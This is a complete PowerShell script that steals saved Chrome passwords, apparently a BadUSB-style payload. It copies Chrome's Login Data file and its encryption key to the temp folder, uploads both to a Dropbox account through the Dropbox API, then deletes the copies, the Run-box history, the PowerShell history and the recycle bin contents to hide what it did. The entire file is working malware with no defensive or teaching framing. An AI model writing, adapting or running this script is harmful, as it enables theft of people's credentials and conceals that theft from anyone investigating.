$DropBoxAccessToken = "your_dropbox_app_api_token"
$FileName1 = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_Login_Data"
$FileName2 = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_Key.txt"

# Obtain the credentials from the Chrome browsers User Data folder
# First we Kill Chrome just to be safe
Stop-Process -Name Chrome

$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'

# Copy the login data file to temp folder
$s="$z\\Default\\Login Data"
cp $s $env:TMP\$FileName1

# Grab the decryption key and save it in temp folder
$b=((gc "$z\\Local State").Replace('""', '"_empty"')|ConvertFrom-Json).os_crypt.encrypted_key
echo $b >> $env:TMP\$FileName2

# Start Chrome again
$pathToChrome = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
Start-Process -FilePath $pathToChrome

# Upload the obtained files to Dropbox
# Upload login data file
$TargetFilePath="/$FileName1"
$SourceFilePath="$env:TMP\$FileName1"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

# Upload decryption key file
$TargetFilePath="/$FileName2"
$SourceFilePath="$env:TMP\$FileName2"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

#Cleanup Traces
# Delete contents of Temp folder 
rm $env:TMP\$FileName1 -Force -ErrorAction SilentlyContinue
rm $env:TMP\$FileName2 -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#exit
exit
